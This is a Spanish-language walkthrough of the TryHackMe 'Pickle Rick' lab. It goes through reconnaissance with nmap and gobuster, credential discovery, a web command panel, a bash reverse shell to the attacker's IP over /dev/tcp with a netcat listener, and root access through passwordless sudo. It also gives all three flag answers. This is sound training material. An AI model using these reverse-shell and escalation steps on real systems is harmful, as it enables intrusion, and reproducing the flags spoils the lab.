# Pickle Rick

![image.png](./imagenes/Imagenes_PickleRick/image.png)

Maquinas que vamos a utilizar Kali Llinux y Pickle Rick  [https://tryhackme.com/room/picklerick](./imagenes/Imagenes_PickleRick/https://tryhackme.com/room/picklerick)

- Vamos a mirar nuestra IP
    
    ```bash
    ifconfig
    ```
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%201.png)
    
    En este caso como estamos en un VPN nuestra Ip esta en el interface tun0: IP : **10.21.203.172**
    

- La IP de la maquina victima es: **10.10.214.144**
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%202.png)
    

---

```bash
sudo nmap -p- -sS -sV --min-rate=5000 -n -vvv -Pn 10.10.214.144
```

![image.png](./imagenes/Imagenes_PickleRick/image%203.png)

- Vamos a ver lo que esta corriendo en el puerto 80 atraves del navegador web.
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%204.png)
    
    - Inspeccionamos el código fuente de la web `CTRL+U`
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%205.png)
        
        Tenemos nuestra primera posible pista. un nombre de usuario:  `R1ckRul3s`
        

- Listamos directorios con Gobuster y buscamos posibles archivos con distintas extensiones.
    
    ```bash
    gobuster dir -u [http://10.10.214.144/](./imagenes/Imagenes_PickleRick/http://10.10.214.144/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
    ```
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%206.png)
    
    Encontramos una posible ruta donde probar el usuario que hemos encontrado así como el archivo robots.txt el cual vamos a mirar su contenido.
    
    - Contenido del robots.txt
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%207.png)
        
        Nos lo apuntamos por si es alguna contraseña o nos pueda servir para algo mas adelante. `Wubbalubbadubdub`
        
    - Vamos a la pagina de Login.php y probamos el usuario y la posible contraseña que hemos encontrado
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%208.png)
        
    - Nos encontramos una barra de comandos que responde a comandos de Linux aunque no a todos. Hacemos un `ls`  y vemos varios archivos de texto que puede ser interesantes.
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%209.png)
        
    
    - Escribimos `less Sup3rS3cretPickl3Ingred.txt`
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2010.png)
        
         Ya tenemos la primera Flag: `mr. meeseek hair`
        
        NOTA: El archivo clue.txt no contenía nada interesante.
        
- Aprovechando que acepta comando vamos a intentar introducir un código para crear un reverse Shell.
    - Nos vamos a la web: https://www.revshells.com/
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2011.png)
        
        Obtenemos esta reverse Shell **`sh** -i >& /dev/tcp/**10.21.203.172**/**443** 0>&1` pero debemos adaptarla para que nos la coja correctamente añadiendo al principio `bash -c` y la revershell es importante ponerlo entre comillas rectas `" "`.
        
        `bash -c "**sh** -i >& /dev/tcp/**10.21.203.172**/**443** 0>&1"`
        
    - En un terminal nos ponemos a la escucha en el puerto 443 con netcat.
        
        ```bash
        sudo nc -nlvp 443  
        ```
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2012.png)
        
    - Lanzamos el comando de la Reverse Shell
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2013.png)
        
        Obtenemos una conexio
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2014.png)
        

---

### Vamos a empezar el tratamiento de la TTY .

Nos colocamos en la terminal de la maquina victima.

- Escribimos el siguiente comando  y veremos que adquirimos un prompt.
    
    `script /dev/null -c bash`
    
- Hacemos un **`CTRL+Z`**

- Escribimos a continuación.
    
    `stty raw -echo; fg`
    

- Escribimos `reset xterm` . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.

- Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
    
    `export TERM=xterm`
    
    `export SHELL=bash`
    
    Con esto ya abrimos estabilizado el terminal y ya nos aceptaría los comandos que antes no lo hacia.
    

---

- Nos movemos al directorio raíz y desde hay vamos investigando. en este caso voy al directorio `home`
    - `cd /`
        
        `cd home`
        
        `ls -la`
        
        ![image.png](./imagenes/Imagenes_PickleRick/image%2015.png)
        

- Miramos dentro de la carpeta rick
    
    `cd rick/`
    
    `ls -la`
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2016.png)
    

- Miramos el contenido del archivo
    
    `cat 'second ingredients’`
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2017.png)
    
    Ya tenemos la segunda Flag: `1 jerry tear`
    

---

Vamos a intentar escalar privilegios con Sudo -l

- `sudo -l`
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2018.png)
    
    Vemos que podemos ser root sin necesidad de contraseña.
    
    `sudo su`
    
    `whoami`
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2019.png)
    
- Seguimos investigando y vamos a la carpeta root
    
    `cd root`
    
    `ls -la`
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2020.png)
    

- Miramos el contenido del archivo 3rd.txt
    
    `cat 3rd.txt` 
    
    ![image.png](./imagenes/Imagenes_PickleRick/image%2021.png)
    
    Ya tenemos la tercera Flag: `fleeb juice`